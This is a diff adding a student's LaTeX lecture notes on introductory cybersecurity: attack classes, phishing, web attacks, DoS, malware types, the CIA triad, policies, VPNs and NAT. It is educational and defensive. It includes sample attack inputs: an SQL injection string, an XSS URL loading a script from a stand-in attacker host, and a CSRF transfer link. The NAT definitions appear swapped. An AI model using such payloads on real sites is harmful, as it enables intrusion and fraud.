@@ -1,0 +1,315 @@
+\documentclass[12pt]{report}
+\usepackage{graphicx} % Required for inserting images
+\usepackage[a4paper, margin=2.5cm]{geometry}
+\graphicspath{{images/}}
+\usepackage{tcolorbox}
+% To prevent "Chapter N" display for each chapter
+\usepackage[compact]{titlesec}
+\usepackage{wasysym}
+\usepackage{import}
+
+\titlespacing*{\chapter}{0pt}{-2cm}{0.5cm}
+\titleformat{\chapter}[display]
+{\normalfont\bfseries}{}{0pt}{\Huge}
+
+% Use single quotes around titles:
+\usepackage[british]{babel}
+\usepackage{csquotes}
+
+\usepackage{hyperref}
+\hypersetup{
+    colorlinks=true,
+    linkcolor=black,
+    filecolor=magenta,
+    urlcolor=blue,
+    citecolor=black,
+}
+
+\usepackage[utf8]{inputenc}
+\usepackage[T1]{fontenc}
+\usepackage{float} % here for H placement parameter
+\usepackage{subcaption}
+
+\usepackage{multicol}
+
+
+\begin{document}
+
+\tableofcontents
+
+\addtocounter{chapter}{6}
+
+\chapter{Lecture 7}
+\section{Cyberattacks}
+A cyber attack is an attempt to exploit a vulnerability in a system, device or network with the intent to steal information or gain unauthorised access.
+Nobody is necessarily safe from a cyber attack, though certain things like military bases are at much higher risk of them.
+The severity of an attack will likely vary based on the attacker's motivations, whether they're financial, political, government-related, gang-related or
+for espionage.
+
+\subsection{Attack classifications}
+\begin{multicols}{1}
+\begin{itemize}
+	\item \textbf{Social engineering} (has dedicated section) 
+		\begin{itemize}
+			\item Psychological exploitation of a person to make them do something to breach confidentiality.
+		\end{itemize}
+	\item \textbf{Web application attacks} (has dedicated section)
+		\begin{itemize}
+			\item SQL injections, XSS, CSRF, eavesdropping.
+		\end{itemize}
+	\item System intrusion
+		\begin{itemize}
+			\item Attacks using malware and/or hacking.
+		\end{itemize}
+	\item Misc. errors
+		\begin{itemize}
+			\item Unintentional actions compromising security. (e.g. PC left unattended)
+		\end{itemize}
+	\item Privilege misuse 
+		\begin{itemize}
+			\item Issues caused by unapproved or malicious usage of elevated privileges given legitimately.
+		\end{itemize}
+	\item Lost \& stolen assets
+		\begin{itemize}
+			\item Attacks where information went missing, unintentionally or maliciously.
+		\end{itemize}
+	\item Denial of service 
+		\begin{itemize}
+			\item Attacks where the availability of a network/system is compromised. Includes both network \& application layer attacks.
+		\end{itemize}
+\end{itemize}
+\end{multicols}
+
+\pagebreak
+
+\subsection{Social engineering}
+\begin{itemize}
+	\item Phishing
+		\begin{itemize}
+			\item
+		\end{itemize}
+	\item Spear-phishing
+		\begin{itemize}
+			\item A phshing variant that's highly targeted at a specific individual using information learned about them from other sources such as social media pages.
+			Multi-stage (studying the victim, studying habits, friends, etc)
+		\end{itemize}
+	\item Vishing (``Voice-phishing'')
+		\begin{itemize}
+			\item Over-the-phone scams
+		\end{itemize}
+	\item Online phishing
+		\begin{itemize}
+			\item Fake websites designed to look identical to the real one. Attempts to get users to input sensitive details as a result of them not paying close enough attention.
+		\end{itemize}
+\end{itemize}
+
+\subsection{Prevention}
+Phishing is so popular because people are the weakest link in any system. It doesn't matter what crazy security you have if an idiot is in charge of it
+and someone can exploit them. It's very easy and very cheap to phish. Mitigating phishing can be attempted via:
+\begin{multicols}{2}
+\begin{itemize}
+	\item User security awareness training
+	\item Multi-factor authentication (MFA)
+	\item Not oversharing on social media
+	\item Updated systems
+	\item Spam filters
+\end{itemize}
+\end{multicols}
+\pagebreak
+
+\section{Web application attacks}
+\subsection{SQL injections}
+SQL injections are a method of attack where SQL code is entered into an input field. 
+If the site is poorly made, this code actually will be executed. For example:
+\begin{verbatim}
+	Username: Lewis OR 1=1;
+\end{verbatim}
+This would return all users, as 1 = 1 is a true statement, so \newline SELECT * FROM USERS WHERE 1 = 1 will select all.
+
+\subsubsection{Prevention}
+To prevent SQL injection attacks, statements must be \textbf{prepared} (or otherwise sanitised) to remove escape characters and ensure that the user's input cannot
+possibly be processed by the database as anything other than what it should be.
+
+\subsection{Cross-site scripting (XSS)}
+XSS is an attack vector where a threat agent manipulates a URL to perform unintended actions. For example,
+\begin{verbatim}
+https://my-site.com/messages?msg="Hello!"
+\end{verbatim}
+could be manipulated into 
+\footnotesize\begin{verbatim}
+https://my-site.com/messages?msg=<script src=https://evil-user.com/virus.js></script>
+\end{verbatim}
+\normalsize
+
+\subsection{Cross-site request forging/forgery (CSRF)}
+CSRF is an attack vector where a threat agent uses a legitimate link to bypass the need for the attacker to gain the user's credentials. Because sites store the current login, a link can be sent to perform an action and if a user clicks it, they will have done the threat agent's will without the need for their credentials to be stolen. For example,
+\begin{verbatim}
+http://bank.com/transfer?account=Hacker&amount=1000
+\end{verbatim}
+Because the user is logged in, this is a completely legitimate link. CSRF can also be used in alternative ways such as loading the link into a clickable image.
+
+
+\pagebreak
+
+\section{DoS and DDoS}
+\subsection{Types}
+\begin{multicols}{2}
+\begin{itemize}
+	\item SYN flood attack
+		\begin{itemize}
+			\item Repeated SYN (hello) packets, overloading the server. Server expects more data than just the request so it keeps waiting until there are too many sessions.
+		\end{itemize}
+	\item Smurf attack 
+		\begin{itemize}
+			\item Repeated ICMP packets using a victim's spoofed IP.
+		\end{itemize}
+	\item Botnet attack
+		\begin{itemize}
+			\item ``Zombie'' devices that have been hacked and puppeteered into DDoSing something.
+		\end{itemize}
+	\item Ping of Death attack
+		\begin{itemize}
+			\item Malicious data repeatedly sent until system crash.
+		\end{itemize}
+
+\end{itemize}
+\end{multicols}
+
+\section{Viruses}
+A virus is a program that affects or infects a computer negatively, changing the way it works without the user's knowledge or permission. They may then spread.
+\subsection{Types}
+\begin{itemize}
+	\item Worm
+	\begin{itemize}
+		\item Spreads repeatedly across memory and/or a network, using many of its resources.
+	\end{itemize}
+	\item Trojan horse
+	\begin{itemize}
+		\item Impersonates legitimate software but hides a malicious payload. Doesn't spread to other computers. 
+	\end{itemize}
+	\item Spyware
+	\begin{itemize}
+		\item Secretly gathers information and remains hidden. 
+	\end{itemize}
+	\item Ransomware
+	\begin{itemize}
+		\item Encrypts data until a fee has been paid, but even then you still have to trust they'll actually send you a decryptor. They may threaten to delete or release the data; whichever they think would harm you/the company more. 
+	\end{itemize}
+\end{itemize}
+
+\chapter{Lecture 8}
+\section{Principles of cybersecurity - \textbf{CIA Triad}}
+\subsection{Confidentiality}
+Preventing unauthorised access to, or diclosure of, information either in transit or on a device (`at rest') 
+\begin{multicols}{2}
+\subsubsection{Breaching}
+\begin{itemize}
+	\item Social engineering
+	\item Eavesdropping
+	\item Captured network traffic 
+	\item Password theft
+	\item Data theft due to lack of encryption
+\end{itemize}
+\subsubsection{Upholding}
+\begin{itemize}
+	\item Encryption
+	\item Data classification \& labelling
+	\item Access Control
+	\item User security awareness training
+\end{itemize}
+\end{multicols}
+
+\subsection{Integrity}
+Preventing unauthorised or unintentional modification of data.
+\begin{multicols}{2}
+\subsubsection{Breaching}
+\begin{itemize}
+	\item Viruses
+	\item Unauthorised acces
+	\item Malicious modifications
+	\item Hackers (?)
+	\item Backdoors
+\end{itemize}
+\subsubsection{Upholding}
+\begin{itemize}
+	\item Encryption
+	\item Access control
+	\item \textbf{File hash verification}
+	\item Intrusion detection systems
+	\item User awareness training
+\end{itemize}
+\end{multicols}
+\subsection{Availability}
+Ensuring that data is available to authorised users as and when needed without interruption.
+\begin{multicols}{2}
+\subsubsection{Breaching}
+\begin{itemize}
+	\item Device failures
+	\item Environmental threats (earthquake, internet outage from storm etc)
+\end{itemize}
+\subsubsection{Upholding}
+\begin{itemize}
+	\item Traffic monitoring
+	\item Firewalls (mitigating DoS/DDoS)
+	\item Regularly maintained backups
+	\item Business continuity plans
+\end{itemize}
+\end{multicols}
+\pagebreak
+
+\section{Security policies}
+Documents produced by senior management dictating specific strategic requirements across the business. They dictate the overall direction and management intent. 
+Not complying with security policies is often grounds for disciplinary action up to and including termination. Intensely important to the continued operation of a business.
+There are often many security policies. They allow companies to \textbf{protect assets, reduce risk, safeguard intellectual property and comply with regulations.}
+
+\section{Standards}
+Mandatory controls to help enforce the security policy and consistency across the business. Passworth length \& complexity mandates are standards.
+Standards directly concern technology and products.
+
+\section{Procedures}
+Step-by-step instructions on how to implement standards and policies.  For example, standard operating procedures (SOP) would assign work roles where certain roles are directly responsible for given cybersecurity and privacy tasks. For example, the CEO is likely to oversee and govern, the CTO to operate \& maintain, etc.
+
+\section{Common policies}
+\begin{multicols}{3}
+\begin{itemize}
+	\item Data breach response
+	\item Email
+	\item Data retention
+	\item Internet usage
+	\item Password
+	\item Access control
+\end{itemize}
+\end{multicols}
+
+\section{LANs and WANs}
+\subsection{Local Area Networks}
+A network in a \textbf{single} geographically contiguous site. Often has one owner. An organisation with multiple premises would have a LAN for each one, with private connections to form a single logical LAN. Often have routers with firewalls controlling internet access.
+
+\subsection{Wide Area Networks}
+A network spanning a larger geographical area, up to and including the entire world, like the Internet itself.
+
+\section{Virtual Private Networks}
+VPNs were \textbf{originally created for users outside of a LAN to connect to it}, and still are to this day, though they are additionally used for country spoofing nowadays.
+\subsection{Encapsulation}
+VPNs encrypt data before encapsulating it in an outer layer and then sending it to the VPN server. The server then decrypts the outer packet and then sends the packet to its intended destination. A third party in this scenario can only see the encrypted outer packet and does not have the means to remove the encapsulation.
+
+\large\textbf{Expand on VPNs, they're likely important to the exam.}\normalsize
+
+\section{NATs}
+Network Address Translations allow for communications across networks by translating network addresses to specific devices,
+because a router only has one public IP which represents the whole network and all of its devices.
+
+\begin{multicols}{2}
+	\begin{itemize}
+		\item Source NATs allow servers \textbf{outside} of a firewall/router to communicate with clients \textbf{inside} it.
+		\item Destination NATs allow servers \textbf{inside} of a firewall/router to communicate with clients \textbf{outside} it.
+	\end{itemize}
+\end{multicols}
+
+\chapter*{Misc.}
+\addtocounter{chapter}{-11}
+\addcontentsline{toc}{chapter}{Misc.}
+\section{Eavesdropping}
+Passive eavesdropping is where the attacker is listening to comms and not modifying them. Active is where they are modifying them (deleting, sending their own, etc)
+
+\end{document}
